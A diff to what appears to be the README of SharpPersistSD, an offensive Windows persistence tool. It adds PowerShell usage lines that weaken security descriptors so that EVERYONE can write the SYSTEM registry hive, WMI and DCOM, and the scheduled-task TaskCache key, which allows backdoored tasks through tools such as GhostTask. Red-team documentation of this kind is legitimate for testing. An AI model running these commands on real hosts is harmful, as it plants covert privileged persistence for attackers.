@@ -108,7 +108,7 @@ Get-Acl -Path "HKLM:SYSTEM\<key>" | Format-List
 #Modify key to allow write  
 [SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control","EVERYONE",$true)
 
-#Alternatively, you can set it on "SYSTEM", which lets you create services, scheduled tasks just via registry keys (eg. GhostTask)
+#Alternatively, you can set it on "SYSTEM", which lets you create services and do just about anything associated with registry keys
 ```
 ## WMI SD, allow everyone 
 ```
@@ -116,6 +116,12 @@ Get-Acl -Path "HKLM:SYSTEM\<key>" | Format-List
 [SharpPersistSD.SecurityDescriptor]::WMI_ModifyWMISD("Hostname","(A;;CCWP;;;WD)") 
 [SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryContainingSD("DCOM","Hostname","(A;;CCDCRP;;;WD)","software\microsoft\ole", "MachineLaunchRestriction")
 
+#Can use any wmi tool to connect (eg. SharpWMI)
+```
+## SCHTASK Tasks key, allow everyone. Must run on LOCAL MACHINE AS SYSTEM  
+```
+#Modify Reg Key to allow "EVERYONE" access to modify existing scheduled tasks via reg key (eg. GhostTask.exe)
+[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryPermissions("localhost","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks","EVERYONE",$true)
 #Can use any wmi tool to connect (eg. SharpWMI)
 ```
 
